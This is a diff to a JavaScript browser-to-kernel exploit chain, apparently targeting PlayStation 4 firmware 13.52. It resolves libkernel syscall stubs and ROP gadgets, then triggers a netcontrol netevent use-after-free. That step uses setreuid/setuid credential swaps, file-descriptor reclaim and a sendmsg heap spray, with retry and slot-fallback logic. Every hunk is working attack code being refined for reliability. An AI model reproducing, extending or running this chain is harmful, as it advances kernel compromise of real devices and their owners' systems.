@@ -71,7 +71,7 @@ function check(name, ok, detail) {
 function hx(n) { return "0x" + (n >>> 0).toString(16); }
 
 const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
-              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
+              getuid: 0x18, setreuid: 126, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
               socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
               readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
               setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
@@ -122,9 +122,12 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
+const CHAIN_BUILD = "plop-13.52-2026-03-26b";
+
 (async function () {
     let p = null;
     try {
+        mark("CHAIN-BUILD", CHAIN_BUILD);
 
         const NUM_IOV_WORKER = params.has("iov")
             ? parseInt(params.get("iov"), 10) : 4;
@@ -293,6 +296,15 @@ let allDone = false;
         if (!check("module-bases-0x4000-aligned",
             aligned(webkitBase) && aligned(libkernelBase), "")) return;
 
+        // __error in libkernel .text (13.52 k__error) — not WebKit IAT (+0x3cb8cc8).
+        let errorFn = null;
+        if (libkernelBase && off.k__error)
+            errorFn = libkernelBase.add32(off.k__error);
+        if (!errorFn && webkitBase && off.wk___imp___error) {
+            try { errorFn = p.read8(webkitBase.add32(off.wk___imp___error)); } catch (_) { }
+        }
+        mark("ERRNO-FN", errorFn ? String(errorFn) : "MISSING");
+
         const G = {};
         const GAD = [
             ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
@@ -332,6 +344,7 @@ let allDone = false;
             for (const numStr in off.k_stubs) {
                 const num = +numStr, o = off.k_stubs[numStr];
                 const v = p.read8(libkernelBase.add32(o));
+                if (!v) continue;
                 if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                 if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                 stubAddr.set(num, libkernelBase.add32(o)); seeded++;
@@ -342,6 +355,7 @@ let allDone = false;
         let scanned = 0;
         for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
             const v = p.read8(libkernelBase.add32(o));
+            if (!v) continue;
             if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
             const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
             if (!need.has(num)) continue;
@@ -362,6 +376,8 @@ let allDone = false;
                 dv.setUint32(at, v >>> 0, true);
                 dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
             } else {
+                if (!v || typeof v.low !== "number" || typeof v.hi !== "number")
+                    throw new Error("put: bad int64 at 0x" + at.toString(16));
                 dv.setUint32(at, v.low >>> 0, true);
                 dv.setUint32(at + 4, v.hi >>> 0, true);
             }
@@ -419,8 +435,14 @@ let allDone = false;
                      hi: M.frameDv.getUint32(4, true),
                      i32: M.frameDv.getUint32(0, true) | 0 };
         }
-        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
+        const sc = (num, ...a) => {
+            const stub = stubAddr.get(num);
+            if (!stub)
+                throw new Error("missing syscall stub num=0x" + (num >>> 0).toString(16));
+            return callAddr(stub, a);
+        };
         function errno() {
+            if (!errorFn) return -1;
             const r = callAddr(errorFn, []);
             const a = new int64(r.lo, r.hi);
             return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
@@ -500,8 +522,33 @@ let allDone = false;
             return got;
         }
         function netevent(sock, event) {
+            return neteventSlot(-1, sock, event);
+        }
+        function spraySockpair() {
+            argDv.setUint32(0, 0, true); argDv.setUint32(4, 0, true);
+            const r = sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32;
+            if (r !== 0) return 0;
+            return argDv.getInt32(0, true);
+        }
+        function credSwapTwice() {
+            const preferReuid = params.get("setuid") !== "1";
+            if (preferReuid && stubAddr.has(SYS.setreuid)) {
+                const r1 = sc(SYS.setreuid, 1, 1).i32;
+                const r2 = sc(SYS.setreuid, 1, 1).i32;
+                mark("CRED-SWAP", "setreuid(1,1)x2 rv=" + r1 + "," + r2
+                    + " uid=" + sc(SYS.getuid).i32);
+                return r1 !== -1 && r2 !== -1;
+            }
+            const r1 = sc(SYS.setuid, 1).i32;
+            const r2 = sc(SYS.setuid, 1).i32;
+            mark("CRED-SWAP", "setuid(1)x2 rv=" + r1 + "," + r2
+                + " (browser uid=1: often no-op — try default setreuid or ?probe=credswap)");
+            return r1 !== -1 && r2 !== -1;
+        }
+        /** Poops.java slot fallback: ifindex -1 then 1; CLEAR must use same slot. */
+        function neteventSlot(slot, sock, event) {
             argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
-            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
+            const r = sc(SYS.netcontrol, slot, event, argAddr, 8).i32;
             return { rv: r, err: r === -1 ? errno() : 0 };
         }
 
@@ -857,30 +904,31 @@ let allDone = false;
             state("attempt " + attempt + "...", "warn");
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
 
-            // SET_QUEUE retry — after a failed UAF attempt the kernel socket
-            // subsystem can be in a degraded state; yield + fresh socket usually
-            // clears it. Up to 8 tries per attempt before giving up.
-            let dummy = -1, reg = { rv: -1, err: 0 };
-            for (let sq = 0; sq < 8; sq++) {
-                if (dummy !== -1) sc(SYS.close, dummy);
-                if (sq > 0) {
-                    sc(SYS.sched_yield);
-                    sc(SYS.sched_yield);
-                    await new Promise(r => setTimeout(r, 20 * sq));
-                }
-                dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
-                if (dummy === -1) { reg = { rv: -1, err: -1 }; continue; }
-                reg = netevent(dummy, NETEVENT_SET_QUEUE);
-                if (reg.rv !== -1) break;
-            }
+            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
             if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
+            let reg = neteventSlot(-1, dummy, NETEVENT_SET_QUEUE);
+            let slotUsed = -1;
             if (reg.rv === -1) {
-                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
-                sc(SYS.close, dummy); continue;
+                reg = neteventSlot(1, dummy, NETEVENT_SET_QUEUE);
+                slotUsed = 1;
             }
+            if (reg.rv === -1) {
+                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err
+                    + " slots full (both -1 and 1 occupied)"
+                    + (reg.err === 5
+                        ? " — EIO: netevent slots stuck in this WebProcess; full browser close or reboot"
+                        : ""));
+                sc(SYS.close, dummy);
+                continue;
+            }
+            mark("SLOT", "queued=" + dummy + " on slot="
+                + (slotUsed === -1 ? "-1" : "1") + " rv=" + reg.rv);
 
             sc(SYS.close, dummy);
-            sc(SYS.setuid, 1);
+            if (!credSwapTwice()) {
+                mark("ATTEMPT-SKIP", "cred swap failed errno=" + errno());
+                continue;
+            }
             uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
             if (uafSock !== dummy) {
                 mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
@@ -889,15 +937,40 @@ let allDone = false;
                 uafSock = 0;
                 continue;
             }
-            sc(SYS.setuid, 1);
-            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
-            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
+            if (!credSwapTwice()) {
+                mark("ATTEMPT-SKIP", "cred swap #2 failed errno=" + errno());
+                continue;
+            }
+            const clr = neteventSlot(slotUsed, uafSock, NETEVENT_CLEAR_QUEUE);
+            if (clr.rv === -1 && clr.err === 5) {
+                mark("CLEAR-ERR5-COSMETIC", "slot="
+                    + (slotUsed === -1 ? "-1" : "1") + " fd=" + uafSock + " proceeding");
+            }
+            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv
+                + " slot=" + (slotUsed === -1 ? "-1" : "1"));
             committed = true;
 
             try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
             catch (e) { }
 
-            for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
+            const sprayFd = spraySockpair() || 0;
+            mark("SPRAY-FD", sprayFd > 0 ? "using spray fd=" + sprayFd : "fallback fd=0");
+            const sprayErrs = {};
+            let sprayFail = 0, sprayFirst = -1;
+            for (let i = 0; i < 0x80; ++i) {
+                const rv = sc(SYS.sendmsg, sprayFd, msgAddr, 0).i32;
+                if (i === 0) sprayFirst = rv;
+                if (rv !== 0) {
+                    sprayFail++;
+                    const e = errno();
+                    sprayErrs[e] = (sprayErrs[e] | 0) + 1;
+                }
+            }
+            mark("SPRAY-STATS", "fd=" + sprayFd + " first=" + sprayFirst
+                + " fail=" + sprayFail + "/0x80"
+                + (sprayFail ? " errnos=" + JSON.stringify(sprayErrs) : " errnos=none"));
+            if (sprayFail === 0x80 && sprayErrs["14"])
+                mark("SPRAY-HINT", "all EFAULT: no ucred on reclaim heap (setuid(1) no-op @ uid=1 — run ?probe=credswap)");
 
             if (STOP_BEFORE_DOUBLE) {
                 mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
